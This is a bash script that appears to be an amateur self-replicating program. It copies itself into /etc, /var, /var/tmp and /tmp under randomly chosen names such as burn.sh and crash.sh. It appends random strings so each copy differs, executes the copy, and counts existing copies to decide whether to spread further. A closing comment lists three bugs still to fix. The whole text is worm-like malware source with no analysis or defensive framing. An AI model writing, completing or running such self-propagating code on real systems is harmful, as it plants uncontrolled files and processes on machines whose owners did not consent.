#!/bin/bash

dirs=("/etc" "/var" "/var/tmp" "/tmp")
names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
append=("AAAA" "BBBB" "CCCC" "DDDD" "EEEE" "FFFF" "aaaa" "bbbb" "cccc" "dddd" "eeee" "ffff")
rando=${names[RANDOM%4]}
rappend=${append[RANDOM%12]}
counter=0

replicate() {
	for dir in ${dirs[@]}; do
        	cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando"
		if [ $? -eq 0 ]; then
			break
		fi
	done
	return
}

checker(){
	for dir in ${dirs[@]}; do # iterates through directory list
		for name in ${names[@]}; do # iterates through names array in each directory
			findo=$(find "$dir/" -iname "$name" 2>/dev/null) # looks for an existing replicant
			if [ ! -z "$findo" ]; then # if the name is there add 1 to counter
				let counter++
			fi
		done
	done
}

checker
if [ $counter -lt 2 ]; then
	replicate
fi

# 3 problems: Error message on the Append, Spawned replicant is not running, Replication is happening twice
